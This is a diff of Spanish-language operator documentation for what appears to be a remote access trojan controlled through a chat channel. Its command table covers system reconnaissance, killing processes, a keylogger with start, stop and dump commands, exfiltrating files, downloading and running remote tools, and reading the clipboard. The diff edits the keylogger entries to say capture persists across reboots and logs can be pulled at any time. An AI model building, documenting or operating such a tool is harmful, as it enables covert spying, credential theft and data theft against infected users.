@@ -9,9 +9,9 @@ Se ejecutan en el canal de sesión del equipo y responden ahí.
 | `/sysinfo` | Hostname, usuario, IP, Windows, privilegios. | Primera foto del equipo. |
 | `/ps list` | Lista procesos con PID y memoria. | Ver qué corre encima. |
 | `/ps kill <pid>` | Mata el proceso y sus hijos. | Quitar lo que estorba. |
-| `/keylog start` | Arranca el keylogger. | Capturar lo escrito fuera del navegador. |
-| `/keylog stop` | Lo detiene. | Cerrar la captura. |
-| `/keylog dump` | Publica lo capturado. | Leer el log. |
+| `/keylog start` | Reengancha el keylogger si lo detuviste. | Captura activa sin reiniciar. |
+| `/keylog stop` | Lo detiene hasta el próximo arranque. | Cortar la captura en caliente. |
+| `/keylog dump` | Publica lo capturado desde el último dump. | Extraer el log, sin pasar por start. |
 | `/download <ruta>` | Sube un archivo o carpeta comprimida. | Sacar lo que interesa. |
 | `/upload <url>` | Descarga y opcionalmente ejecuta. | Meter una herramienta. |
 | `/clip get` | Lee el portapapeles. | Recuperar lo último copiado. |
